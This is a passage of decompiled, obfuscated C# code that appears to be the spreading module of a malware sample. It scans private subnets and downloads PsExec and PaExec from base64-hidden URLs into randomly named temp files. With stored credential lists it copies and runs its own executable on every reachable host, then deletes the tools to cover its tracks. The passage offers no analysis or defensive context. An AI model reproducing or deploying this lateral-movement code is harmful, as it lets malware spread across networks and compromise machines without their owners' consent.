					fxPtfJOjYtkx.hsyUNnDlbwg(item2.NLMYJrInFggx, item2.lMtvCPvYiCbyR, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(tLLrkXZrUUAvx, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && uEygpOkJTInhS(ip))
				{
					if (yzZnBHwSsJOOcf.XlMZZRHaUB == "YES")
					{
						for (int i = 0; i < FaQeozQIYUzgGo.Count; i++)
						{
							if (yzZnBHwSsJOOcf.vPxSRRyjgDzUS)
							{
								if (File.Exists(vEhLhaWFadwWMta))
								{
									yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(vEhLhaWFadwWMta, "\\\\" + ip + " -u \"" + FaQeozQIYUzgGo[i] + "\" -p \"" + qcCwskpVTaEnYe[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(qAjjKYIVYhRJO))
							{
								yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(qAjjKYIVYhRJO, "\\\\" + ip + " -u \"" + FaQeozQIYUzgGo[i] + "\" -p \"" + qcCwskpVTaEnYe[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (yzZnBHwSsJOOcf.vPxSRRyjgDzUS)
					{
						if (File.Exists(vEhLhaWFadwWMta))
						{
							yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(vEhLhaWFadwWMta, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(qAjjKYIVYhRJO))
					{
						yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(qAjjKYIVYhRJO, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(vEhLhaWFadwWMta))
			{
				File.Delete(vEhLhaWFadwWMta);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(qAjjKYIVYhRJO))
			{
				File.Delete(qAjjKYIVYhRJO);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> qMDojCtJdpPyGie()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string NZYhQqaEqmd()
	{
		if (IntPtr.Size == 8)
		{
			return RDwYKVeRkyliQ(new Uri(yzZnBHwSsJOOcf.jLGThbkXlozfB("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return RDwYKVeRkyliQ(new Uri(yzZnBHwSsJOOcf.jLGThbkXlozfB("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string lhDeYyDWJpvWZ()
	{
		if (IntPtr.Size == 8)
		{
			return RDwYKVeRkyliQ(new Uri(yzZnBHwSsJOOcf.jLGThbkXlozfB("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return RDwYKVeRkyliQ(new Uri(yzZnBHwSsJOOcf.jLGThbkXlozfB("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool uEygpOkJTInhS(string JmIqYuNAZxagJ)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(JmIqYuNAZxagJ);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string RDwYKVeRkyliQ(Uri icRygpBMOiQzmR)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(icRygpBMOiQzmR, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> mzJfiYZzljXmMQn()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string iuqYngOLSzV in array4)
			{
				if (iuqYngOLSzV.Contains(":"))
				{
					array = array.Where((string o) => o != iuqYngOLSzV).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
